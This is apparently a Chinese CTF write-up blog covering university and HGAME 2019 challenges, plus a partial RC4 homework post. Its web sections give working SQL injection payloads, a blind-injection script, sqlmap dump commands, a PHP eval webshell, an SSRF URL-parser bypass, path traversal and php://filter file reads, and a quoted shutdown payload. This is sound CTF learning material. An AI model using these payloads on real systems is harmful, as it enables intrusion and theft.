03类似的即可绕过，也可以使用%00截断，第二层要求两个相同md5值的文件（不是弱类型比较），这样的文件也是有的，记得强网杯好像就有类似的题目，参考一下即可 paylaod： 1curl -v http://202.119.201.199:32790?0ver=02 --data &quot;0ver1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;0ver2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot; 1flag:flag&#123;73100259ca8919f402846b00d3b939a9&#125; SimpleUpload查看源码可知发现前端验证设置了白名单，只允许上传.jpg|.png|.gif。 这里需要绕过前端验证，上传1.jpg，利用burp截断修改后缀名为1.php。 小型线上赌场题目提示了断电，应该是vi文件泄露，测试发现 .index.swp存在泄露，vim恢复一下 1vi -r index.swp 代码如下 123456789101112131415&lt;?php $invest = $_GET['invest']; $rand = rand(2,50); $len = strlen(trim($_GET['invest'])); foreach ($_GET as $key =&gt; $value) &#123; if(!is_numeric($value)||$value == '0')&#123; die('no no no!'); &#125; &#125; $money = number_format($invest*$rand); $money = intval(str_replace(',','',$money)); $guess = intval($_GET['guess']); if ($guess == $money &amp;&amp; strlen($money)===$len) &#123; echo $flag;&#125; 代码思路是提交invest值，然后乘以一个2-50之间的随机数与我们猜测的相等即可得到flag，直接多次尝试爆破即可，即每次都提交invest值为2，guess值为6，只要某次随机数为3的时候即可得到flag 1flag&#123;7e1e2bfe75c980be35c61ed1bde7a6f2&#125; SimpleSQLi1python sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 --dbs 数据库名为security 1python sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 -D security --tables 表名flagishere 1python sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 -D security -T flagishere --columns --threads=10 列名id,flag 1python sqlmap.py -u http://bxs.cumt.edu.cn:30007/test/index.php?id=1 -D security -T flagishere -C &quot;id,flag&quot; --dump --threads=10 1flag&#123;4ur0Ra_SimPlE_sQLi_23333&#125; 真的简单。。随手fuzz一下 1http://202.119.201.199:32793/list.php?id=1%27 报错 1http://202.119.201.199:32793/list.php?id=1%27--+ 可以正常返回，猜测是单引号注入 1http://202.119.201.199:32793/list.php?id=-1%27%20or%201=1--+ 无正确回显，猜测可能是or有问题，换 || 试一下 1http://202.119.201.199:32793/list.php?id=-2%27 || 3=length(database())--+ 果然返回正确，数据库长度为3 题目过滤了or，但是可以绕过 1http://202.119.201.199:32793/list.php?id=-1%27%20oorr%201=1--+ 爆列数 1http://202.119.201.199:32793/list.php?id=-2%27 || 3=3 oorrder by 3--+ 共有三列 1http://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,database(),3--+ database:ctf 接下来就是常规的注入了 1http://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()--+ table：ctf,flag 1http://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=database()--+ 列名：id,flag 1http://202.119.201.199:32793/list.php?id=-2%27 || 3=2 ununionion selselectect 1,flag,3 from flag--+ 居然还有题目.. flag in admin_08163314/exec.php 访问一下，是个命令执行界面，过滤了空格，可用$IFS绕过，尝试列根目录但是失败了，猜测可能是/被过滤了，但是 * .没有被过滤，可以用来读文件exec.php 可以得到源码 1234567891011&lt;?phpfunction waf_exec($str)&#123; $black_str = \"/(;|&amp;|&gt;|&#125;|&#123;|%|#|!|\\?|@|\\+|\\/| )/i\"; $str = preg_replace($black_str, \"\",$str); return $str;&#125;if (@$_POST['cmd']) &#123; $cmd = waf_exec($_POST['cmd']); system($cmd);&#125; 知道了过滤规则就好办了，接下里可以用base64编码绕过，列根目录 注意这里的flag_3314是个目录，还得继续列目录 1flag&#123;3570d4d9c72a19c889140674827eeca5&#125; SimpleSQLi2fuzz测试了一下感觉是数字型注入 1http://bxs.cumt.edu.cn:30010/test/index.php?id=-1%20||%201=1 接下来测试过滤规则 1http://bxs.cumt.edu.cn:30010/test/index.php?id=2&gt;2 || length(&apos;seleselectct&apos;)=6 测试发现过滤了 select,or,空格，空格可用/**/绕过，select等可双写绕过，接下来只需要编写盲注脚本即可 123456789101112131415161718192021import requestswords = \"2019~\"url = \"http://bxs.cumt.edu.cn:30010/test/index.php?id=\"table = \"\"# payload = \"2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;\"# emails,flagishere,referers,uagents,users# payload = \"2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),&#123;&#125;,1))=&#123;&#125;\"# Id,flagpayload = \"2&gt;2/**/||/**/ascii(substr((seselectlect/**/flag/**/from/**/flagishere),&#123;&#125;,1))=&#123;&#125;\"for j in range(1,60): for i in range(34,128): res = requests.get(url+payload.format(j,i)).text if words in res: table += chr(i) print(table) break 可以得到flag如下 1flag&#123;4nother_SimPLE_SQLi_0rek1&#125; 后来和出题人交流了一下，思路非预期2333~ 文件管理系统网站有主要功能是上传文件和修改、删除文件，过滤了php等相关的文件名，无法绕过，原本的我的思路是上传一个xxxx.jpg，然后修改文件名，通过修改文件名为 xxxx.php%00.jpg 或者其它方法截断后面的jpg后缀，结果尝试了各种姿势都未果，无可奈何之下扫了一波目录，结果柳暗花明，得到了源码www.zip 核心代码如下 upload.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475require_once \"common.inc.php\";define('ROOT',dirname(__FILE__).'/'); if($_FILES)&#123; $file = $_FILES[\"upfile\"]; if($file[\"error\"] == UPLOAD_ERR_OK) &#123; $name = basename($file[\"name\"]); $path_parts = pathinfo($name); if(!in_array($path_parts[\"extension\"], array(\"gif\", \"jpg\", \"png\", \"zip\", \"txt\"))) &#123; exit(\"error extension\"); &#125; $path_parts[\"extension\"] = \".\" . $path_parts[\"extension\"]; $name = $path_parts[\"filename\"] . $path_parts[\"extension\"]; $path_parts['filename'] = addslashes($path_parts['filename']); $sql = \"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'\"; $fetch = $db-&gt;query($sql); if($fetch-&gt;num_rows&gt;0) &#123; exit(\"file is exists\"); &#125; //echo $file[\"tmp_name\"], ROOT . UPLOAD_DIR . $name; if(move_uploaded_file($file[\"tmp_name\"], ROOT . UPLOAD_DIR . $name)) &#123; $sql = \"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')\"; $re = $db-&gt;query($sql); if(!$re) &#123; echo 'error'; print_r($db-&gt;error); exit; &#125; $url = \"/\" . UPLOAD_DIR . $name; echo \"Your file is upload, url: &lt;a href=\\\"&#123;$url&#125;\\\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt; &lt;a href=\\\"/\\\"&gt;go back&lt;/a&gt;\"; &#125; else &#123; exit(\"upload error\"); &#125; &#125; else &#123; print_r(error_get_last()); exit; &#125;&#125;``` rename.php```phprequire_once \"common.inc.php\";define('ROOT',dirname(__FILE__).'/'); if(isset($req['oldname']) &amp;&amp; isset($req['newname'])) &#123; $result = $db-&gt;query(\"select * from `file` where `filename`='&#123;$req['oldname']&#125;'\"); if ($result-&gt;num_rows&gt;0) &#123; $result = $result-&gt;fetch_assoc(); &#125;else&#123; exit(\"old file doesn't exists!\"); &#125; if($result) &#123; $req['newname'] = basename($req['newname']); $re = $db-&gt;query(\"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;\"); if(!$re) &#123; print_r($db-&gt;errorInfo()); exit; &#125; $oldname = ROOT.UPLOAD_DIR . $result[\"filename\"].$result[\"extension\"]; $newname = ROOT.UPLOAD_DIR . $req[\"newname\"].$result[\"extension\"]; if(file_exists($oldname)) &#123; rename($oldname, $newname); $url = \"/\" . $newname; echo \"Your file is rename, url: &lt;a href=\\\"&#123;$url&#125;\\\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt; &lt;a href=\\\"/\\\"&gt;go back&lt;/a&gt;\"; &#125; else&#123;echo $oldname.\" not exists.\";&#125; &#125;&#125;?&gt; 由代码可以看出，题目是通过数据库来拼凑最终的文件名，审计了下代码没发现什么有用的思路，google了一下居然找到了原题！！2233 http://drops.xmd5.com/static/drops/tips-10564.html，而且还给出了攻击流程，本题是个二次注入。 题目使用了白名单过滤，所以所以无法通过后缀名绕过，而题目，漏洞发生在rename.php页面中，实现重命名功能时，在数据库中以文件名来查询，获取文件扩展名，id等信息，然后我们输入的新的文件名和查询的文件扩展名拼接在一起完成重命名，如果我们能够使查询的文件扩展名为空，那么拼接之后就只剩下我们的文件名了，通过这种方法可以实现修改文件名后缀的目的，攻击流程如下 选择一个文件上传，命名为 &#39;,extension=&#39;&#39;,filename=&#39;snow.jpg.jpg，此时执行的sql语句是insert into file ( filename, view, extension) values( ‘{$path_parts[‘filename’]}’, 0, ‘{$path_parts[‘extension’]}’)，此时的数据库中filename--&gt;&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg，extension--&gt;jpg 利用update更新是的后缀名为空，old name: &#39;,extension=&#39;&#39;,filename=&#39;snow.jpg;new name: snow.jpg，此时执行的sql命令变成update file set filename=’snow.jpg’,oldname=’’,extension=’’,filename=’snow.jpg.jpg’ where fid={$result[‘fid’]}; ，这样的话数据库中就有文件名为 snow.jpg，后缀名为空的记录，但是实际的文件名却是snow.jpg.jpg 上传真正包含shell的文件&lt;?php @eval($_POST[&#39;snow&#39;]);?&gt; ，命名为snow.jpg，数据库中的记录是文件名为snow，扩展名为jpg， 使用rename重命名 old name: snow.jpg，new name: snow.php，此时修改的是文件名是snow.jpg，后缀名为空，此时修改文件名为snow.php，后缀名为空，拼接后就是成功地更名为snow.php，然后访问snow.php即可getshell。 1flag&#123;f34f8aa6cd362582dd1ae5f975c7b20f&#125; crypto现代密码签到利用在线des解密，密钥为空。解密后发现U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==是base64编码，将所得结果再次解密得到flag 古典密码签到看到字符串带=，猜测是base系列编码，解密发现是base32编码 ^pho^oav`\\ntZnj`\\ntZZZcccx ，之后就是移位密码了，当偏移量是5的时候解密出有意义的明文 123456s = \"xxxxxxxxxxxxx\"flag = \"\"for i in s: flag += chr(ord(i)+5)print(flag)``` cumtctf{easy_soeasy___hhh}1234567891011121314## easyrsa本题e很小，联想到应该是低指数攻击，本来以为是16进制，但是一直不对，细看了一下发现只有0-9和A，b共12个字符，猜测应该是12进制，尝试了一下果然就是12进制```python# coding=utf-8import gmpy2e = 5# 读入 n, 密文n = int(&apos;36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5&apos;,12)c = int(&apos;411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065&apos;,12)m, b = gmpy2.iroot(c, e)print hex(m)[2:].decode(&apos;hex&apos;) flag如下：1cumtctf&#123;12_jinzhi_rsa&#125; playfir题目提示很明显，playfire密码爆破，可以看到秘钥是四位，代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# playfairimport stringimport itertools# 返回该字符的行号和列号def get_row_col(word,pass_table): li = pass_table.index(word) li_r = li // 5 li_c = li % 5 return (li_r,li_c)# 输入两个元素的坐标，得到解密对应的两个元素def get_dou_word(r1,c1,r2,c2): if r1 == r2: c1 = (c1-1) % 5 c2 = (c2-1) % 5 return [(r1,c1),(r2,c2)] elif c1 == c2: r1 = (r1-1) % 5 r2 = (r2-1) % 5 return [(r1,c1),(r2,c2)] else: return [(r1,c2),(r2,c1)]# 解密函数def decrypt(cip,keyword): # global pass_table alpha = list(string.ascii_uppercase) alpha.remove('J') for i in keyword: if i == \"J\": continue alpha.remove(i) pass_table = list(keyword) + alpha plain = \"\" for i in range(len(cip)//2): grp = cip[i*2:i*2+2] r1,c1 = get_row_col(grp[0],pass_table) r2,c2 = get_row_col(grp[1],pass_table) temp = get_dou_word(r1,c1,r2,c2) p1 = temp[0][0]*5 + temp[0][1] p2 = temp[1][0]*5 + temp[1][1] plain += pass_table[p1] + pass_table[p2] return plainfor sss in itertools.permutations(string.ascii_uppercase,4): now_key = \"\".join(sss) cip1 = \"DMBCCVTLMNKQ\" cip2 = \"LRBECXPTCPHU\" t1 = decrypt(cip1,now_key) t2 = decrypt(cip2,now_key) if \"FLAGA\" in t1: print(t1) continue elif \"FLAGB\" in t2: print(t2) continue 可以得到爆破出来符合条件的明文，找出语义正确的即可 flagaplayfirflagbyoudoit 求出md5值即可 1flag&#123;355c1fb44b58ad7c38d88b5ba4f095b0&#125; MISCmisc签到解压之后给出了5个图片文件: 文件夹名是braille，想到了盲文，搜索盲文对照表 根据解压文件夹的提示可以对照出flag是B1ind。 base全家桶了解一下??应该就是base编码的转换，尝试一下不同的base编码即可 第一层base64 1GY3DMQZWGE3DON2CGU3TMNJWIM3DGMZQGZCDMNJVIY3TIMZQGMYDKRRWGM3TKNSEG42DMMZXGQ3DMN2E 第二层base32 1666C61677B57656C63306D655F7430305F63756D746374667D 第三层base16 1flag&#123;Welc0me_t00_cumtctf&#125; BXS图标真好看记事本打开发现是一个二进制文件，file命令查看一下文件类型 BXS.txt: PNG image data, 495 x 422, 8-bit/color RGBA, non-interlaced 修改后缀为png，看到一串文字fgoo kwnl{_u n_gaDy_ 0p}，提示古典加密，猜测是栅栏密码，因为字符串长度是21，所以应该分三栏 1flag&#123;Do_you_kn0w_png&#125; 矿大校歌认真听听吧？下载zip压缩包，解压后需要密码，在16进制编辑器文件尾部看到cumtctf2019，解压即可得到一个mp3文件，音频也没有什么异常，应该是mp3隐写了https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2，运行尝试一下 1Decode.exe -X -P cumtctf2019 cumt.mp3 1flag&#123;cumtctf_1s_v3ry_g00d!&#125; 起床改error啦！binwalk查看图片发现存在zip压缩包，提取一下 12binwalk 2333.pngforemost 2333.png 解压压缩包可以得到一个doc文件，在选项中查看隐藏文字即可看到flag RE逆向签到直接丢进IDA查看，查看伪代码： 可以看到这些变量占用了4个字节来存储。 这里的v35是100以内的任何数，也就是说可以通过爆破的方式来求得v35的值。 查看check函数，s里面的数字应该和从v5开始，地址每加上4LL的值相等。也就是说在29位的flag里面，每一位的值和v5-v34相等。所以写一个简单的脚本即可爆破出来。 12345678#coding:utf-8v5 = [53,63,50,52,40,1,50,61,55,99,62,118,98,60,60,12,106,58,37,54,12,38,12,102,48,60,33,54,46]for i in range(0,100): res = \"\" for j in range(0,29): res += chr(v5[j]^i) print res 运行结果： Eazy_Math同样的，还是丢进IDA中查看伪代码： flag有9位，在经过String2Int和Change两个函数的变换后，如果check成功，即可成功。 首先查看String2Int函数： 这个函数的作用就是将s里面的字符内容转换成int型的数值存储在v14-v18中。 查看Check函数后，可以轻易看出check的内容就是将变换后的9位与v2-v10相比较。 最后是Change函数： 第一个双层循环将a3里面的数值置为0，也就是v4里面的值。第二个三重循环可以拆开来看。前两个变量i和j总共循环9次，代表着算出v4里面的数值。最后一个循环变量m则是计算的过程。这里不妨设9个未知数A,B,C,D,E,F,G,H,I。经过推算，3*k+m 是每次取三个连续的数，3*m+1是每次取0，3，6或1，4，7或2，5，8。这里代表着取v5-v13里面的数值。分析之后可以列出三个方程组： \\begin{cases} A+2B+C=274\\\\ 2A+B+C=294\\\\ A+B+2C=316 \\end{cases} \\begin{cases} D+2E+F=262 \\\\ 2D+E+F=274 \\\\ D+E+2F=252 \\\\ \\end{cases} \\begin{cases} G+2H+I=380 \\\\ 2G+H+I=421 \\\\ G+H+2I=427 \\\\ \\end{cases}简单的方程组求得A-G的9个值转化为字符即为flag。","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"HGAME2019-Web-Week1&2","slug":"hgame2019","date":"2019-01-30T07:15:00.000Z","updated":"2019-02-12T05:04:28.094Z","comments":true,"path":"2019/01/30/hgame2019/","link":"","permalink":"http://chaosec.top/2019/01/30/hgame2019/","excerpt":"前言寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做","text":"前言寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做 week-1谁吃了我的flagvim文件泄露.index.html.swp，vim恢复即可得到flag1hgame&#123;3eek_diScl0Sure_fRom+wEbsit@&#125; very easy weburl二次编码绕过 ?id=%2576%2569%2564%2561%25721hgame&#123;urlDecode_Is_GoOd&#125; 换头大作战题目要求POST传值 1curl http://120.78.184.111:8080/week1/how/index.php --data &quot;want=12&quot; 得到回显 1&lt;br/&gt;https://www.wikiwand.com/en/X-Forwarded-For&lt;br/&gt;only localhost can get flag 依次按照要求设置请求头 1curl http://120.78.184.111:8080/week1/how/index.php --data &quot;want=12&quot; -H &quot;x-forwarded-for:127.0.0.1&quot; -A &quot;User-Agent:Waterfox/50.0&quot; -e www.bilibili.com 1hgame&#123;hTTp_HeaDeR_iS_Ez&#125; can u find me?查看源代码可知存在f12.php界面，在响应头中可以看到密码 woyaoflag，提交即会出现cilck me to get flag，点击则跳转到 toofast.php，回显aoh,your speed is sososo fast,the flag must have been left in somewhere，应该是出现了302跳转，抓包即可得到flag 1hgame&#123;f12_1s_aMazIng111&#125; week-2easy_php探测目录发现robots.txt下存在文件img/index.php，访问之，得到PHP代码 12345678&lt;?php error_reporting(0); $img = $_GET['img']; if(!isset($img)) $img = '1'; $img = str_replace('../', '', $img); include_once($img.\".php\"); highlight_file(__FILE__); 题目过滤了../，且将其转换为空字符串，所以我们可以用..././来绕过，本来试了 ..././flag，可是打不出flag，最终尝试了filter协议，原因在于include语句会将代码当做php代码执行，而转成base64编码之后则由于没有php前缀而无法被当成php代码从而将文本打印出来 payload 1http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=..././flag base64解码即可得到flag， 1hgame&#123;You_4re_So_g0od&#125; php trick代码审计 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET['str1'];$str2 = (string)@$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = @$_GET['H_game'];$url = @$_GET['url'];if( $str1 == $str2 )&#123; die('step 1 fail');&#125;if( md5($str1) != md5($str2) )&#123; die('step 2 fail');&#125;if( $str3 == $str4 )&#123; die('step 3 fail');&#125;if ( md5($str3) !== md5($str4))&#123; die('step 4 fail');&#125;if (strpos($_SERVER['QUERY_STRING'], \"H_game\") !==false) &#123; die('step 5 fail');&#125;if(is_numeric($str5))&#123; die('step 6 fail');&#125;if ($str5&lt;9999999999)&#123; die('step 7 fail');&#125;if ((string)$str5&gt;0)&#123; die('step 8 fial');&#125;if (parse_url($url, PHP_URL_HOST) !== \"www.baidu.com\")&#123; die('step 9 fail');&#125;if (parse_url($url,PHP_URL_SCHEME) !== \"http\")&#123; die('step 10 fail');&#125;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);$output = curl_exec($ch);curl_close($ch);if($output === FALSE)&#123; die('step 11 fail');&#125;else&#123; echo $output;&#125; 第一个点md5绕过，第二个点是数组绕过，php数组在比较是比任何数字都大，payload 1http://118.24.3.214:3001?str1=240610708&amp;str2=QNKCDZO&amp;str3[]=a&amp;str4[]=b&amp;H%5fgame[]=5&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php 用两个@的原因可以参考这篇文章ref 当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对user@eval.com:80@baidu.com 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com 可以得到admin.php页面的代码 12345678910111213//flag.phpif($_SERVER['REMOTE_ADDR'] != '127.0.0.1') &#123; die('only localhost can see it');&#125;$filename = $_GET['filename']??'';if (file_exists($filename)) &#123; echo \"sorry,you can't see it\";&#125;else&#123; echo file_get_contents($filename);&#125;highlight_file(__FILE__); 查看代码可知存在flag.php页面，关键代码如下：123456if (file_exists($filename)) &#123; echo \"sorry,you can't see it\";&#125;else&#123; echo file_get_contents($filename);&#125; 当filename是flag.php（即文件存在时），又无法读取到文件，此时可以利用file_get_contents支持多种协议来读取到文件，可以使用php://filter协议，最终payload如下 1http://118.24.3.214:3001?str1=240610708&amp;str2=QNKCDZO&amp;str3[]=a&amp;str4[]=b&amp;H%5fgame[]=5&amp;url=http://@127.0.0.1:80@www.baidu.com/admin.php?filename=php://filter/read=convert.base64-encode/resource=flag.php flag.php 1&lt;?php $flag = hgame&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125; ?&gt; PHP Is The Best Language1234567891011121314151617181920212223include 'secret.php';#echo $flag;#echo $secret;if (empty($_POST['gate']) || empty($_POST['key'])) &#123; highlight_file(__FILE__); exit;&#125;if (isset($_POST['door']))&#123; $secret = hash_hmac('sha256', $_POST['door'], $secret);&#125;$gate = hash_hmac('sha256', $_POST['key'], $secret);if ($gate !== $_POST['gate']) &#123; echo \"Hacker GetOut!!\"; exit;&#125;if ((md5($_POST['key'])+1) == (md5(md5($_POST['key'])))+1) &#123; echo \"Wow!!!\"; echo \"&lt;/br&gt;\"; echo $flag;&#125;else &#123; echo \"Hacker GetOut!!\";&#125; 代码审计题目，核心代码在于 12345678if (isset($_POST['door']))&#123; $secret = hash_hmac('sha256', $_POST['door'], $secret);&#125;$gate = hash_hmac('sha256', $_POST['key'], $secret);if ($gate !== $_POST['gate']) &#123; echo \"Hacker GetOut!!\"; exit;&#125; 我们无法控制$secret变量，自然无法计算出对应的哈希值，那么有没有那种带加密输入（door）的哈希与secret值无关呢？在PHP里面这个是存在的，就是数组(Array)，由于数组是hash_hmac无法处理的输入类型，所以会返回null 第二处在于(md5($_POST[&#39;key&#39;])+1) == (md5(md5($_POST[&#39;key&#39;])))+1 此处我们可以爆破 123456for($i=1;$i&lt;9999999999;$i++)&#123; if ((md5($i)+1) == (md5(md5($i)))+1) &#123; echo $i; break; &#125;&#125; 结果为12 最终payload为 1door[]=12&amp;key=12&amp;gate=4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf flag如下 1hgame&#123;Php_MayBe_Not_Safe&#125; Baby_Spider题目考察我们的爬虫能力，真的做的我胃疼 题目一共30关，40秒内答对30关的数学题即可获得flag 1-10需要用token先登录一下，注意要带上UA头，如果不带的话到第十关算式就会变成1(lambda __g: [(os.system(&apos;shutdown -s -t 0&apos;), (os.system(&apos;shutdown now&apos;), None)[1])[1] for __g[&apos;os&apos;] in [(__import__(&apos;os&apos;, __g, __g))]][0])(globals())#-----=? 由eval函数执行之后直接就关机了（这反爬虫机制真的是骚~~） 11-20第十一关开始题目就变了，居然修改了css字体，抓取一下css文件如下123456@font-face &#123; font-family: Ariali; src: url(&apos;/static/Ariali.otf&apos;); font-weight: normal; font-style: normal;&#125; 下载字体可以看到数字对应规则变化了，对应置换一下即可 21-30此关开始之后，隐藏了真实的数学表达式位置，如果按照题目的计算答案是错的，结果是在css中的after元素下找到了算式，获取之后计算即可 最终paylaod如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import requestsimport retoken = \"KxvEiiWBm41Xe6PTlKS3DnR4vsnfFcXL\"headers = &#123;'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0'&#125;url1 = \"http://111.231.140.29:10000\"url2 = \"http://111.231.140.29:10000/question\"url3 = \"http://111.231.140.29:10000/solution\"url4='http://111.231.140.29:10000/statics/style.css'res = requests.post(url1,data=dict(token=token))cookies = res.cookiesal_list = '1026943587'for i in range(1,11): # res = requests.get(url2,cookies=cookies,headers=headers) print('-------------round',i,'---------------') exp = re.findall(r'&lt;span&gt;(.+)&lt;/span',res.text)[0] print(exp) data = dict(answer=str(eval(exp[:-2]))) res = requests.post(url3,cookies=cookies,data=data,headers=headers) cookies = res.cookies for i in range(11,21): print('-------------round',i,'---------------') exp = re.findall(r'&lt;span&gt;(.+)&lt;/span',res.text)[0] exp = list(exp) for x in range(len(exp)): if ord(exp[x])&gt;47 and ord(exp[x]) &lt; 59: exp[x] = al_list[ord(exp[x])-48] exp = \"\".join(exp) print(exp) data = dict(answer=str(eval(exp[:-2]))) res = requests.post(url3,cookies=cookies,data=data,headers=headers) cookies = res.cookiesfor i in range(21,31): print('-------------round',i,'---------------') res = requests.get(url4,cookies=cookies,headers=headers) exp = re.findall(r'content:\"(.+)\"',res.text)[0] print(exp) data = dict(answer=str(eval(exp[:-2]))) res = requests.post(url3,cookies=cookies,data=data,headers=headers) cookies = res.cookies if 'hgame' in res.text: print(res.text) flag如下： 1hgame&#123;e7b2703a92574012c10a90d0c96051a5b38c8d60a8861c66e7a0898812144083&#125; Math有趣先是一道数学题，到了第二题之后是一个图片，点击图片链接，发现链接有猫腻img/cXVlc3Rpb24ucG5n.php，base64解码之后是question.png，尝试了一下../../../../../etc/passwd(base64编码)，发现可以成功读取文件接下来就是探测工作目录了，学到一个东西，可以探测.bash_history，该文件记录了最近的bash命令../../../../../root/.bash_history 工作目录为/usr/local/tomcat/webapps/ROOT 接下来我们可以给链接加=诱发报错 1http://test.tan90.me:8080/img/cXVlc3Rpb24ucG5n=.php 最终定位到类目录，读取代码../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class 然后反编译，定位到flag的位置 123456789@RequestMapping(value=&#123;\"/flag\"&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)public String Flag(ModelMap model)&#123; System.out.println(\"This is the last question.\"); System.out.println(\"123852^x % 612799081 = 6181254136845 % 612799081\"); System.out.println(\"The flag is hgame&#123;x&#125;.x is a decimal number.\"); model.addAttribute(\"flag\", \"Flag is not here.\"); return \"flag\";&#125; 这个数学问题可以用Baby Step Giant Step算法解决，github上有相关的代码 1py bsgs.py 123852 6181254136845 612799081 可以得到最小的答案是15387368 flag如下：hgame{15387368}","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"密码学作业记录（二）","slug":"crypto2","date":"2019-01-15T15:26:17.000Z","updated":"2019-01-30T11:44:37.833Z","comments":true,"path":"2019/01/15/crypto2/","link":"","permalink":"http://chaosec.top/2019/01/15/crypto2/","excerpt":"接上篇","text":"接上篇 序列密码RC4算法​RC4算法是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 算法原理： ​RSA算法原理非常简单，256字节的状态向量S= {0，1，…，255}，用比特字节表示为S= {00000000, 00000001, ….，11111111}。用一个可变长度为1~256字节（8~8048位）的密钥来初始化256字节的状态向量S={S[0], S[1], …, S[255]}，任何时候，S都包含0~255的8位无符号数的排列组合。加密和解密时，密码流中的每一个字节k由S产生，通过系统的方式随机从S的256个元素中选取一个。每产生一个字节k，S的元素都要被再次排列。具体步骤如下:​ 步骤一：S向量原状态： 1​S=[0,1,2,...,255] 步骤二：创建临时向量T（256位），如果密钥K的长度为256位，则直接将K赋给T，否则一直重复复制K，直到填满256位的向量T 步骤三：接下来我们使用T向量来产生S的初始排列。这个过程从S[0]开始一直处理到S[255]，同时对每个S[i]，根据T[i指定的方案将S[i]与S的另一个元素进行交换： 步骤四：密码流产生。一旦S向量的初始排列完成后，密钥就不再被使用。接下来就是使用S自身来不断输出伪随机密码流的过程了。 步骤五：加密。将步骤四中获得的随机字节k与明文的下一字节做异或运算，产生的字节即为对应的密文字节。 ​解密时，由于加密只是使用密码流对明文做了异或运算，因此解密过程只需要使用相同步骤产生密码流并对密文进行同样的异或运算即可得到加密前的明文。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import sysimport base64s = []t = []# 初始化sfor i in range(256): s.append(i);# 秘钥# 通常取16字节k = [1,45,12,12,3,5,6,7,123,45,78,95,65,23,44,55]# 为暂时向量t赋值for i in range(256): t.append(k[i % len(k)])j = 0for i in range(256): j = (j+s[i]+t[i]) % 256 s[i],s[j] = s[j],s[i]f = open('a.txt','rb')text = f.read()# 产生密钥流q = []i = 0j = 0for r in range(len(text)): i = (i+1) % 256 j = (j+s[i]) % 256 s[i],s[j] = s[j],s[i] t = (s[i] + s[j]) % 256 q.append(s[t])cipher = \"\"for i in range(len(text)): t = (q[i] 